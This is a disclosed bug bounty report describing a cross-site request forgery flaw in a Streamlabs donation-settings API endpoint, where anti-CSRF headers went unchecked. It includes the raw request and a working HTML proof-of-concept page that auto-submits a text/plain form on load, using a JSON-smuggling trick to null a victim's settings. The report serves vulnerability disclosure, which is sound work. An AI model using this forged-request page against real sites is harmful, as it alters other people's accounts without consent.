# CSRF in changing users donation_settings [https://streamlabs.com/api/v6/viewer-portal/viewer-settings/donation_settings]

## Report Details
- **Report ID**: 1049360
- **URL**: https://hackerone.com/reports/1049360
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-12-03T03:07:26.513Z
- **Disclosed**: 2020-12-26T13:23:44.243Z

## Reporter
- **Username**: sudi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: logitech

## Vulnerability Information
Hey there,
I have found that the `api/v6/viewer-portal/viewer-settings/donation_settings` endpoint is vulnerable to csrf attack, which allows an attacker to update victim's  donation_settings like *username*,*amount*.

---------------------------------------------------------------------------------------------------------------------------------------------------

Here is the requets made  when the user changes his donation settings, there were X-CSRF and X-XSRF header present in the request but the application wasn't validating them. So I just removed those headers and 200Ok response was recieved without any error

```
POST /api/v6/viewer-portal/viewer-settings/donation_settings HTTP/1.1
Host: streamlabs.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 143
Connection: close
Cookie: Redacted
Upgrade-Insecure-Requests: 1

{"username":{"value":"shirley","autofill":false},"amount":{"value":null,"currency":"USD","autofill":true},"clips":{"isVisibleToPublic":true}}
```

```
HTTP/1.1 200 OK
Date: Thu, 03 Dec 2020 02:38:51 GMT
Content-Type: application/json


true
```

By visiting this endpoint https://streamlabs.com/api/v6/viewer-portal/viewer-settings/donation_settings you could see your donation settings.
```json
{"settings":{"clips":{"isVisibleToPublic":true},"amount":{"value":null,"autofill":true,"currency":"USD"},"username":{"value":"shirley","autofill":false}}}
```
---------------------------------------------------------------------------------------------------------------------------------------------------

**Steps to reproduce:**

Copy paste this html code and save it in a .html extension file

```html
<html>
<title>JSON CSRF POC</title>
<center>
<h1> JSON CSRF POC </h1>
<body onload="document.createElement('form').submit.call(document.getElementById('myForm'))">
<form id="myForm" action=https://streamlabs.com/api/v6/viewer-portal/viewer-settings/donation_settings method=post enctype="text/plain" >
<input name='{"username":{"value":"shirley","autofill":false},"amount":{"value":null,"currency":"USD","autofill":true},"clips":{"isVisibleToPublic":true,"ignore_me":"' value='test"}}'type='hidden'>
</form>
</center>
</html>
```

Then just load this file in your browser and the changes will be made.

If you now visit this endpoint: https://streamlabs.com/api/v6/viewer-portal/viewer-settings/donation_settings. The response will be:

```
HTTP/1.1 200 OK
Date: Thu, 03 Dec 2020 02:48:11 GMT
Content-Type: application/json
Content-Length: 15
Connection: close


{"settings":[]}
```

---------------------------------------------------------------------------------------------------------------------------------------------------

**POC:**

{F1102063}

---------------------------------------------------------------------------------------------------------------------------------------------------

## Impact

An attacker can set the donation settings of a victim to null, here I couldn't possibly change the victim's donation setting values for like username  to something else because the Content-Type of the request must be application/json, as it's not possib;le to do set this content-type with html forms I used text/plain which doesn't updates the field values but I can still set them to null 


Thankyou
Regards
Sudhanshu

## Attachments
- nvD6oqXkMq.mp4
